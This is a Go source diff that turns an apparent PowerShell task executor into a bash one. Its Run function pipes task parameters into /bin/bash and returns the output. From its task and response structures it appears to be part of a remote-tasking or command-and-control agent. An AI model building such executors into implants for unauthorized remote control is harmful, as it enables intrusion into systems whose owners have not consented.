@@ -1,30 +1,29 @@
-package powershell_executor
+package bash_executor
 
 import (
 	// Standard
 	"bytes"
+	"os"
 	"os/exec"
 	"strings"
 
-	// chrysalis
+	// src
 
 	"github.com/FractalKnight/chrysalis/pkg/utils/structs"
 )
 
-// Run - Function that executes the powershell_executor command
+// Run - Function that executes the bash_executor command
 func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
-	pwrshellBin := "powershell"
-	arg1 := "-nologo"
-	arg2 := "-noprofile"
-	if _, err := exec.LookPath(pwrshellBin); err != nil {
-		msg.SetError("Could not find powershell.exe ")
+	bashBin := "/bin/bash"
+	if _, err := os.Stat(bashBin); err != nil {
+		msg.SetError("Could not find /bin/bash")
 		task.Job.SendResponses <- msg
 		return
 	}
 
-	cmd := exec.Command(pwrshellBin, arg1, arg2)
+	cmd := exec.Command(bashBin)
 	cmd.Stdin = strings.NewReader(task.Params)
 	var out bytes.Buffer
 	cmd.Stdout = &out
